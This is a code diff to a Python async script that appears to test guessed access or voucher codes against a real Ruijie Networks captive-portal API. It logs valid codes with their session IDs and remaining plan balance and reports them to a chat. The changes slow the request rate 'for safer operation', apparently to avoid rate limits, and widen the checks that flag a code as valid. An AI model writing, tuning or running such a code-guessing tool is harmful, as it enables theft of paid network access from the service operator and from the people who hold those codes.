@@ -48,8 +48,8 @@ session = None
 _connector = None
 
 # --- Constants ---
-CONCURRENCY = 5  # Initial concurrency, will be adjusted
-RATE_LIMIT_DELAY = 0.2 # Initial delay
+CONCURRENCY = 2  # Reduced concurrency for safer operation
+RATE_LIMIT_DELAY = 0.5 # Increased initial delay for safer operation
 RATE_LIMIT_FACTOR = 1.5 # Factor to increase delay on rate limit
 RATE_LIMIT_MAX_DELAY = 10 # Maximum delay in seconds
 
@@ -424,7 +424,7 @@ def _parse_minutes(val):
     rem_days = days % 30
     return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"
 
-async def get_balance(session_id):
+async def get_balance(session_obj, session_id):
     url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}"
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
@@ -443,7 +443,7 @@ async def get_balance(session_id):
 
     }
     try:
-        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+        async with session_obj.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
             raw = await resp.text()
             logger.debug(f"[get_balance] session_id={session_id} status={resp.status} body={raw[:300]}")
             if resp.status != 200:
@@ -577,7 +577,10 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     global RATE_LIMIT_DELAY
                     RATE_LIMIT_DELAY = max(0.1, RATE_LIMIT_DELAY / RATE_LIMIT_FACTOR)
 
-                if 'logonUrl' in response_text:
+                # Check for success indicators in the response JSON
+                # Check for success conditions
+                if 'logonUrl' in response_text or resp_json.get("success") == True or resp_json.get("code") == 0:
+                    logger.info(f"Successfully found code {code}. Response: {resp_json}")
                     plan_str = "N/A"
                     try:
                         fetched = await get_balance(task_session, session_id) # Pass task_session
@@ -592,13 +595,13 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                             logger.info(f"Code {code} with plan {plan_str} does not match filters {plan_filters}. Skipping.")
                             return None
 
-                    logger.info(f"Successfully found code {code} with plan {plan_str}")
                     return {"code": code, "session_id": session_id, "plan": plan_str}
-                elif 'STA' in response_text:
-                    logger.info(f"Code {code} is limited.")
+                # Check for limited conditions
+                elif 'STA' in response_text or resp_json.get("code") == 1:
+                    logger.info(f"Code {code} is limited. Response: {resp_json}")
                     return {"code": code, "session_id": session_id, "plan": "Limited"}
                 else:
-                    logger.info(f"Code {code} not successful or limited. Response: {response_text[:200]}")
+                    logger.info(f"Code {code} not successful or limited. Full response: {response_text}")
                     return None
         except aiohttp.ClientError as e:
             logger.error(f"Network error during perform_check for code {code}: {e}")
